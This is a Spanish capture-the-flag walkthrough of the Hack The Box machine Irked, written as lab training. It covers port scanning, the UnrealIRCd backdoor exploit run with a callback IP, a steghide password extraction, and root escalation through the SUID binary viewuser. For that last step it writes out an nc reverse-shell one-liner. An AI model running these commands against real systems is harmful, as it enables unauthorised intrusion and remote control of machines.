Irked es una box bastante simple y directa que requiere habilidades básicas de enumeración. Muestra la necesidad de escanear todos los puertos en las máquinas e investigar cualquier binario fuera de lugar encontrado mientras se enumera un sistema. 

Escaneo:
nmap -Pn -p- -open 10.10.10.117 -T4
![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/8e8c56c0-5e97-4139-be55-87c084aaff7c)

 Versiones:
 nmap -Pn -sCV -p22,80,111,6697,8067,52895,65534 10.10.10.117 -T4
![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/f432a9e1-7847-4cf7-ad47-6503dce91ba9)

 Encontramos un dominio 
![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/e4b21a59-70f8-40e4-a3e5-d6ca63b57a79)
![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/bfa86b04-6ed4-4d3d-8719-b9d4f3358cd3)


# UnrealIRCd Unreal3.2.8.1
Luego de enumerar un buen rato encontré lo siguiente  ayudado de hacktricks
https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc
nc 10.10.10.117 6697
![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/9465e67a-811a-4bf2-b608-27918b6b32e8)

Añadimos USER master 0 * master  Nick master encontrado Unreal3.2.8.1, validamos un exploit.
searchsploit UnrealIRCd -w

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/064a1a02-af05-40f4-893f-8b37dceca912)

Como hay varios buscamos en GitHub un exploit que no use metasploit 
https://github.com/chancej715/UnrealIRCd-3.2.8.1-Backdoor-Command-Execution
![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/1ac7c003-93eb-4481-aaa8-32ade03781f4)

ejecutamos de acuerdo a las instrucciones.
![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/133ab6c8-a6a6-454e-a349-9eca83abb35a)

 python3 script.py 10.10.10.117 6697 10.10.14.2 123
 
 ![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/b8c32d23-5771-49be-8556-f40ac75d6703)

 y en netcat tenemos acceso al pc
 
![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/f69474f1-a9a7-4b87-a9ed-f5733cb8a84c)

Mejoramos shell

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/e4eac07c-db4a-4298-b808-b0d9b965a5bb)

Enumerando la máquina encontramos otro usuario y su flag esta allí por lo cual debemos ser djmarov

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/3f52e386-84c1-4121-88e5-cda8a94d55b3)

validando el archivo cat unrealircd.conf

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/751d5dcd-355e-4f50-a073-2dc466464482)

buscando dentro del directorio /home/djmardov/Documents encuentro de manera oculta el  archivo .backup que contiene un password.

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/2aab7543-b3f7-4f8d-9dca-5b82a01fe560)


# Esteganografia para jpg ==steghide==
Al principio intenté conectar por ssh con las credenciales encontradas mooc y UPup, pero nada funciono luego leí bien el mensaje del .backup sobre super elite steg backup pw steg de steghide y la imagen obviamente del index.

steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/c0027ffc-64c6-46fd-a327-8ed4a70b154e)

validamos pass.txt

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/36dbd8fd-28f0-48ca-8806-c19c998f0df2)

nos conectamos por ssh 
ssh djmardov@10.10.10.117

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/84268c8a-68b6-4aca-addc-6ad862463caf)

# binario viewuser
Ahora enumerando la máquina con djmardov encuentro el siguiente binario raro 
find / -perm -4000 2>/dev/null

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/086ba064-df75-41c6-9b15-d10b7ca252f0)


lo ejecuto 
viewuser

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/c9a5fde9-b359-42d3-aa26-875865c2f846)

Se detecta que se intenta guardar lo obtenido en ese /tmp/listusers.
Busco en internet 

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/1496c577-4084-4ebb-9851-b898390adfcb)

Abro el primer vínculo 

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/84865244-a14d-4563-9b97-6b263c4014e6)

Allí nos dice que se crea el archivo /tmp/listusers y se le da full permisos aparte que dentro de este archivo tendrá la reverse Shell.
creo ese file listusers pero le añado una reverse shell 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f" > /tmp/listusers

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/bfdc3390-f366-450d-8e2b-91c1b1410c50)
Reviso el netcat y somos root

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/d6e35e92-a80c-4690-9e75-f44226634bc4)

otra forma de validar el file listuser es haciendo un simple id 
echo id > /tmp/listusers

![image](https://github.com/4madomaster/Amadomaster-machines/assets/169741500/eed0ac21-0ea3-46fc-9fe7-3e415af2f007)

aca detectamos permisos denegados es decir que si ejecuta comandos.


Maquina media tirando a facil muy chevere sobre todo la parte del steghide hacia mucho no utilizaba esta herramienta. 
